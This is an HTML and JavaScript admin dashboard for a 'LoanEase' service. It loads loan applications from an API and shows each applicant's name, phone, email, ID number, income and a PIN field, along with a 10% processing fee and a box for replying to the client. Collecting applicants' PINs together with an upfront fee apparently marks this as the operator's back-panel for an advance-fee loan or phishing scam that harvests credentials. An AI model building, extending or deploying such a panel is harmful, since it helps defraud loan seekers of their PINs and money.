<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>LoanEase Admin Dashboard</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f4f7fb;
      color: #222;
    }

    header {
      background: linear-gradient(135deg, #0057B8, #16A34A);
      color: white;
      padding: 22px 15px;
      text-align: center;
    }

    header h1 {
      margin: 0;
      font-size: 26px;
    }

    header p {
      margin: 7px 0 0;
      font-size: 14px;
    }

    .container {
      width: 95%;
      max-width: 1100px;
      margin: 20px auto;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 10px;
      margin-bottom: 15px;
      flex-wrap: wrap;
    }

    .top-bar h2 {
      margin: 0;
      font-size: 21px;
    }

    button {
      border: none;
      border-radius: 8px;
      padding: 11px 16px;
      cursor: pointer;
      font-size: 14px;
      font-weight: bold;
    }

    .refresh-btn {
      background: #0057B8;
      color: white;
    }

    .refresh-btn:hover {
      opacity: 0.9;
    }

    .message {
      display: none;
      padding: 12px;
      border-radius: 8px;
      margin-bottom: 15px;
      text-align: center;
      font-size: 14px;
    }

    .success {
      background: #dcfce7;
      color: #166534;
    }

    .error {
      background: #fee2e2;
      color: #991b1b;
    }

    .loading {
      text-align: center;
      padding: 30px;
      color: #555;
    }

    .application {
      background: white;
      border-radius: 12px;
      margin-bottom: 20px;
      padding: 18px;
      box-shadow: 0 3px 12px rgba(0,0,0,0.08);
      border-left: 5px solid #0057B8;
    }

    .application-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 10px;
      flex-wrap: wrap;
      margin-bottom: 15px;
      padding-bottom: 12px;
      border-bottom: 1px solid #eee;
    }

    .application-header h3 {
      margin: 0;
      font-size: 20px;
    }

    .status {
      padding: 7px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: bold;
      background: #fff3cd;
      color: #856404;
    }

    .details {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
    }

    .detail {
      background: #f8fafc;
      padding: 11px;
      border-radius: 7px;
      word-break: break-word;
    }

    .detail strong {
      display: block;
      color: #555;
      font-size: 12px;
      margin-bottom: 4px;
    }

    .detail span {
      font-size: 14px;
      font-weight: 500;
    }

    .pin-value {
      font-family: monospace;
      letter-spacing: 2px;
    }

    .reply-section {
      margin-top: 18px;
      padding-top: 15px;
      border-top: 1px solid #eee;
    }

    .reply-section h4 {
      margin: 0 0 10px;
      color: #0057B8;
    }

    textarea {
      width: 100%;
      min-height: 90px;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 10px;
      font-family: Arial, sans-serif;
      font-size: 14px;
      resize: vertical;
    }

    .reply-btn {
      margin-top: 8px;
      background: #16A34A;
      color: white;
    }

    .reply-btn:hover {
      opacity: 0.9;
    }

    .empty {
      background: white;
      padding: 35px 20px;
      text-align: center;
      border-radius: 12px;
      color: #666;
      box-shadow: 0 3px 12px rgba(0,0,0,0.06);
    }

    .tracking {
      color: #0057B8;
      font-weight: bold;
    }

    @media (max-width: 650px) {
      .details {
        grid-template-columns: 1fr;
      }

      .container {
        width: 94%;
      }

      header h1 {
        font-size: 22px;
      }

      .application {
        padding: 14px;
      }
    }
  </style>
</head>

<body>

<header>
  <h1>LoanEase Admin Dashboard</h1>
  <p>Manage loan applications</p>
</header>

<div class="container">

  <div class="top-bar">
    <h2>Loan Applications</h2>
    <button class="refresh-btn" onclick="loadApplications()">
      Refresh Applications
    </button>
  </div>

  <div id="message" class="message"></div>

  <div id="applications">
    <div class="loading">
      Loading applications...
    </div>
  </div>

</div>

<script>

  function showMessage(text, type) {
    const message = document.getElementById("message");

    message.textContent = text;
    message.className = "message " + type;
    message.style.display = "block";

    setTimeout(() => {
      message.style.display = "none";
    }, 4000);
  }


  function safe(value) {
    if (
      value === undefined ||
      value === null ||
      value === ""
    ) {
      return "Not provided";
    }

    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#039;");
  }


  function money(value) {
    if (
      value === undefined ||
      value === null ||
      value === ""
    ) {
      return "Not provided";
    }

    const number = Number(value);

    if (isNaN(number)) {
      return safe(value);
    }

    return "USD " + number.toLocaleString();
  }


  function getStatus(application) {
    return application.status ||
           application.applicationStatus ||
           "Pending";
  }


  function getName(application) {
    return application.fullName ||
           application.name ||
           "Not provided";
  }


  function getPhone(application) {
    return application.phone ||
           application.phoneNumber ||
           "Not provided";
  }


  function getEmail(application) {
    return application.email ||
           "Not provided";
  }


  function getIdNumber(application) {
    return application.idNumber ||
           application.id ||
           "Not provided";
  }


  function getOccupation(application) {
    return application.occupation ||
           "Not provided";
  }


  function getIncome(application) {
    return application.monthlyIncome ||
           application.income ||
           "Not provided";
  }


  function getPin(application) {
    return application.pin ||
           application.PIN ||
           "Not provided";
  }


  function getPurpose(application) {
    return application.loanPurpose ||
           application.purpose ||
           "Not provided";
  }


  function getAmount(application) {
    return application.amount ||
           application.loanAmount ||
           application.requestedAmount ||
           "";
  }


  function getPeriod(application) {
    return application.period ||
           application.repaymentPeriod ||
           "Not provided";
  }


  function getProcessingFee(application) {
    return application.processingFee || "";
  }


  function getTotalDue(application) {
    return application.totalAmountDue ||
           application.totalDue ||
           "";
  }


  function getTrackingNumber(application) {
    return application.trackingNumber ||
           application.tracking ||
           "Not provided";
  }


  function getDate(application) {
    if (!application.createdAt) {
      return "Not provided";
    }

    try {
      return new Date(application.createdAt).toLocaleString();
    } catch (error) {
      return safe(application.createdAt);
    }
  }


  function createApplicationCard(application) {

    const name = getName(application);
    const phone = getPhone(application);
    const email = getEmail(application);
    const idNumber = getIdNumber(application);
    const occupation = getOccupation(application);
    const income = getIncome(application);
    const pin = getPin(application);
    const purpose = getPurpose(application);
    const amount = getAmount(application);
    const period = getPeriod(application);
    const processingFee = getProcessingFee(application);
    const totalDue = getTotalDue(application);
    const trackingNumber = getTrackingNumber(application);
    const status = getStatus(application);
    const date = getDate(application);

    const card = document.createElement("div");

    card.className = "application";

    card.innerHTML = `

      <div class="application-header">

        <h3>${safe(name)}</h3>

        <span class="status">
          ${safe(status)}
        </span>

      </div>


      <div class="details">

        <div class="detail">
          <strong>Tracking Number</strong>
          <span class="tracking">
            ${safe(trackingNumber)}
          </span>
        </div>


        <div class="detail">
          <strong>Application Date</strong>
          <span>
            ${safe(date)}
          </span>
        </div>


        <div class="detail">
          <strong>Full Name</strong>
          <span>
            ${safe(name)}
          </span>
        </div>


        <div class="detail">
          <strong>Phone</strong>
          <span>
            ${safe(phone)}
          </span>
        </div>


        <div class="detail">
          <strong>Email</strong>
          <span>
            ${safe(email)}
          </span>
        </div>


        <div class="detail">
          <strong>ID Number</strong>
          <span>
            ${safe(idNumber)}
          </span>
        </div>


        <div class="detail">
          <strong>Occupation</strong>
          <span>
            ${safe(occupation)}
          </span>
        </div>


        <div class="detail">
          <strong>Monthly Income</strong>
          <span>
            ${money(income)}
          </span>
        </div>


        <div class="detail">
          <strong>PIN</strong>
          <span class="pin-value">
            ${safe(pin)}
          </span>
        </div>


        <div class="detail">
          <strong>Loan Purpose</strong>
          <span>
            ${safe(purpose)}
          </span>
        </div>


        <div class="detail">
          <strong>Loan Amount</strong>
          <span>
            ${money(amount)}
          </span>
        </div>


        <div class="detail">
          <strong>Repayment Period</strong>
          <span>
            ${safe(period)}
          </span>
        </div>


        <div class="detail">
          <strong>Processing Fee (10%)</strong>
          <span>
            ${money(processingFee)}
          </span>
        </div>


        <div class="detail">
          <strong>Total Amount Due</strong>
          <span>
            ${money(totalDue)}
          </span>
        </div>

      </div>


      <div class="reply-section">

        <h4>Reply to Client</h4>

        <textarea
          id="reply-${safe(application._id || application.id || trackingNumber)}"
          placeholder="Type your message to the client..."
        ></textarea>

        <button
          class="reply-btn"
          onclick="replyToClient(
            '${safe(application._id || application.id || trackingNumber)}',
            '${safe(phone)}',
            '${safe(email)}'
          )"
        >
          Reply to Client
        </button>

      </div>

    `;

    return card;
  }


  async function loadApplications() {

    const container =
      document.getElementById("applications");

    container.innerHTML = `
      <div class="loading">
        Loading applications...
      </div>
    `;

    try {

      const response =
        await fetch("/api/applications");

      if (!response.ok) {
        throw new Error(
          "Server returned " + response.status
        );
      }

      const data =
        await response.json();


      let applications = data;

      if (data.applications) {
        applications = data.applications;
      }


      if (!Array.isArray(applications)) {
        applications = [];
      }


      container.innerHTML = "";


      if (applications.length === 0) {

        container.innerHTML = `
          <div class="empty">
            <h3>No loan applications yet</h3>
            <p>
              Submitted applications will appear here.
            </p>
          </div>
        `;

        return;
      }


      applications.forEach(application => {

        const card =
          createApplicationCard(application);

        container.appendChild(card);

      });


    } catch (error) {

      console.error(
        "Error loading applications:",
        error
      );

      container.innerHTML = `
        <div class="empty">
          <h3>Unable to load applications</h3>

          <p>
            ${safe(error.message)}
          </p>

          <button
            class="refresh-btn"
            onclick="loadApplications()"
          >
            Try Again
          </button>
        </div>
      `;

    }

  }


  async function replyToClient(
    applicationId,
    phone,
    email
  ) {

    const textarea =
      document.getElementById(
        "reply-" + applicationId
      );

    if (!textarea) {
      alert("Reply box not found.");
      return;
    }


    const message =
      textarea.value.trim();


    if (!message) {
      alert(
        "Please type a message before replying."
      );
      return;
    }


    try {

      const response =
        await fetch("/api/applications/" +
                    encodeURIComponent(applicationId) +
                    "/reply", {

          method: "POST",

          headers: {
            "Content-Type": "application/json"
          },

          body: JSON.stringify({
            message: message,
            phone: phone,
            email: email
          })

        });


      const data =
        await response.json();


      if (!response.ok) {

        throw new Error(
          data.message ||
          data.error ||
          "Reply failed"
        );

      }


      textarea.value = "";

      showMessage(
        "Reply sent successfully.",
        "success"
      );


    } catch (error) {

      console.error(
        "Reply error:",
        error
      );

      showMessage(
        error.message ||
        "Unable to send reply.",
        "error"
      );

    }

  }


  loadApplications();

</script>

</body>
</html>
